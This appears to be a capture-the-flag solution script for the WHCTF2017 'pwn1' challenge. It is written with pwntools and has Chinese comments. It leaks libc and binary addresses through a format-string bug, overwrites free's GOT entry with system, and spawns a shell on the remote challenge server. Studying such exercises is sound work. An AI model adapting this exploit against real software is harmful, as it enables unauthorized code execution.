#coding:utf8  
from pwn import *  
from LibcSearcher import *  
  
#context(log_level='debug')  
# sh = process('./pwn1')
sh = remote('111.200.241.244',64467)
elf = ELF('./pwn1')
  
#这一步是为了让free的GOT表内容加载  
sh.sendlineafter('Input Your Code:\n','2')  
sh.sendlineafter('Input Your Name:\n','test')  
  
  
sh.sendlineafter('Input Your Code:\n','1')  
#泄露__libc_start_main+F0的地址  
payload = 'a'*(0x3E8)+'bb%397$p'  
sh.sendafter('Welcome To WHCTF2017:\n',payload)  
sh.recvuntil('0x')  
__libc_start_main = int(sh.recvuntil('\n'),16) - 0xF0  
  
libc = LibcSearcher('__libc_start_main',__libc_start_main)  
#获得libc加载基地址  
libc_base = __libc_start_main - libc.dump('__libc_start_main')  
system_addr = libc_base + libc.dump('system')  
print 'system addr=',hex(system_addr)  
  
sh.sendlineafter('Input Your Code:\n','1')  
#泄露init的地址  
payload = 'a'*(0x3E8)+'bb%396$p'  
sh.sendafter('Welcome To WHCTF2017:\n',payload)  
sh.recvuntil('0x')  
  
init_addr = int(sh.recvuntil('\n'),16)  
#获得程序的加载基地址,0xDA0为init在二进制文件中的静态地址  
elf_base = init_addr - 0xDA0  
#free的GOT表地址  
free_addr = elf_base + elf.got['free']  
  
print 'free_addr=',hex(free_addr)  
  
#以下两步修改free的GOT表内容，让它指向system  
sh.sendlineafter('Input Your Code:\n','1')  
#覆写倒数的第3、4字节数据  
data = (system_addr & 0xFFFFFFFF) >> 16  
#那个百分号前的两个aa是为了凑出8字节  
payload =  'a'*(0x3E8) + ('bb%' + str(data - 0x3FE) + 'c%133$hn').ljust(16,'a') + p64(free_addr + 2)  
sh.sendafter('Welcome To WHCTF2017:\n',payload)  
  
#覆写倒数的2字节数据  
data = system_addr & 0xFFFF  
sh.sendlineafter('Input Your Code:\n','1')  
payload =  'a'*(0x3E8) + ('bb%' + str(data - 0x3FE) + 'c%133$hn').ljust(16,'a') + p64(free_addr)  
sh.sendafter('Welcome To WHCTF2017:\n',payload)  
  
#getshell  
sh.sendlineafter('Input Your Code:\n','2')  
sh.sendlineafter('Input Your Name:\n','/bin/sh')  
  
sh.interactive()